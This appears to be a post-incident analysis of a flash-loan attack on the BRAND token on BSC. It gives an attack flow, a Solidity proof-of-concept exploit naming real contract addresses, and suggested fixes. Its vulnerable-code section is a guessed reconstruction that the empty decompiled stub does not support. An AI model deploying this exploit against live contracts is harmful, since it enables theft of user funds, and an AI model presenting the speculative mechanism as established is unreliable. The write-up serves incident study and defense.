# BRAND Flash Loan buyToken Repeated Call Attack Incident Analysis

## 1. Overview

| Item | Details |
|------|------|
| Project | BRAND Token |
| Date | 2023-11-05 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~23 WBNB |
| Attack Type | Flash Loan + Repeated buyToken() Price Manipulation |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | `0x835b45d38cbdccf99e609436ff38e31ac05bc502` |
| Attack Contract | `0xf994f331409327425098feecfc15db7fabf782b7` |
| Vulnerable Contract | `0x831d6F9AA6AF85CeAD4ccEc9B859c64421EEeFD4` |
| Fork Block | 33,139,124 |

## 2. Vulnerable Code Analysis

The vulnerable contract in the BRAND token ecosystem allowed repeated calls to the `buyToken()` function. The attacker borrowed 300 WBNB via a DODO DPP flash loan to acquire a large amount of BRAND, then called `buyToken()` 100 times in succession to manipulate the internal reward mechanism or price curve. The attacker then sold BRAND under the manipulated state to realize a profit.

```solidity
// Vulnerable pattern: no restriction on repeated buyToken() calls
contract BRANDVulnContract {
    IERC20 public BRAND;
    mapping(address => uint256) public rewards;
    uint256 public priceMultiplier;

    // Vulnerable: no restriction on repeated calls within the same block
    function buyToken() external {
        // Internal state update — cumulative effect occurs on repeated calls
        priceMultiplier += 1;
        rewards[msg.sender] += priceMultiplier;
        // Price curve manipulation allows buying BRAND cheaply or selling at inflated price
    }
}
```

**Vulnerability**: The `buyToken()` function had no restriction on repeated calls within the same block, allowing 100 consecutive calls to manipulate the internal price state. After accumulating a large BRAND position via flash loan, selling post-manipulation yielded a profit.

### On-Chain Original Code

Source: Bytecode decompiled

```solidity
// File: BRAND_decompiled.sol
    function buyToken() external {}  // ❌
```

## 3. Attack Flow

```
Attacker [0x835b45d38cbdccf99e609436ff38e31ac05bc502]
  │
  ├─1─▶ DPPOracle.flashLoan(300 WBNB, 0, address(this), data)
  │      [DPPOracle: 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476]
  │      DPPFlashLoanCall callback triggered
  │
  ├─2─▶ swap_token_to_token(WBNB → BRAND, 300 ether)
  │      [BRAND: 0x4d993ec7b44276615bB2F6F20361AB34FbF0ec49]
  │      [Router: 0x10ED43C718714eb63d5aA57B78B54704E256024E]
  │      Large BRAND position acquired
  │
  ├─3─▶ Repeated buyToken() calls (100 times):
  │      for (i=0; i<100; i++) {
  │          VulnContract.buyToken()
  │      }
  │      [VulnContract: 0x831d6F9AA6AF85CeAD4ccEc9B859c64421EEeFD4]
  │      Internal price/reward state manipulated
  │
  ├─4─▶ swap_token_to_token(BRAND → WBNB)
  │      BRAND sold at manipulated price
  │      → Excess WBNB recovered
  │
  └─5─▶ WBNB.transfer(DPPOracle, 300 ether)
         Flash loan repaid + ~23 WBNB profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address to, bytes calldata data) external;
}

contract BRANDExploit {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Pair Pair = IUniswapV2Pair(0x88fF4f62A75733C0f5afe58672121568a680DE84);
    IERC20 BRAND = IERC20(0x4d993ec7b44276615bB2F6F20361AB34FbF0ec49);
    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    address VulnContract = 0x831d6F9AA6AF85CeAD4ccEc9B859c64421EEeFD4;

    function testExploit() external {
        DPP.flashLoan(300 ether, 0, address(this), abi.encode(uint8(3)));
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // Swap WBNB → BRAND
        swap_token_to_token(address(WBNB), address(BRAND), 300 ether);

        // Call buyToken 100 times
        for (uint i = 0; i < 100; i++) {
            VulnContract.call(abi.encodeWithSignature("buyToken()"));
        }

        // Swap BRAND → WBNB
        swap_token_to_token(address(BRAND), address(WBNB), BRAND.balanceOf(address(this)));

        // Repay flash loan
        WBNB.transfer(msg.sender, baseAmount);
    }

    function swap_token_to_token(address tokenIn, address tokenOut, uint256 amount) internal {
        IERC20(tokenIn).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | No restriction on repeated buyToken() calls; price/reward state manipulation |
| Impact Scope | BRAND token WBNB/BRAND pair |
| Explorer | [BSCscan](https://bscscan.com/address/0x831d6F9AA6AF85CeAD4ccEc9B859c64421EEeFD4) |

## 6. Security Recommendations

```solidity
// Fix 1: Limit calls per block
mapping(address => uint256) public lastCallBlock;
mapping(address => uint256) public callCountInBlock;

function buyToken() external {
    if (lastCallBlock[msg.sender] == block.number) {
        callCountInBlock[msg.sender]++;
        require(callCountInBlock[msg.sender] <= 1, "Too many calls per block");
    } else {
        lastCallBlock[msg.sender] = block.number;
        callCountInBlock[msg.sender] = 1;
    }
    // ...
}

// Fix 2: EOA-only function
function buyToken() external {
    require(msg.sender == tx.origin, "No contracts");
    // ...
}

// Fix 3: Apply non-linear cost to state changes
uint256 public callCount;

function buyToken() external {
    callCount++;
    // Cost increases as call count grows — discourages repeated calls
    uint256 cost = baseCost * callCount;
    require(msg.value >= cost, "Insufficient payment");
    // ...
}
```

## 7. Lessons Learned

1. **Repeated Call Vulnerability**: Functions that modify internal state, such as `buyToken()`, must explicitly restrict repeated calls within the same transaction. 100 consecutive calls is not a normal usage pattern.
2. **DODO Flash Loan + Small BSC Protocols**: The pattern of flash loan followed by repeated function calls recurs across BSC DeFi attacks. The repeated-call risk of every state-modifying function must be reviewed.
3. **Business Logic Separation**: Separating functions that influence price or reward calculations from functions that handle actual token transfers limits the impact of single-function exploitation.
4. **Flash Loan Simulation**: Before deploying a protocol, simulate flash loan + repeated call scenarios to identify vulnerabilities proactively.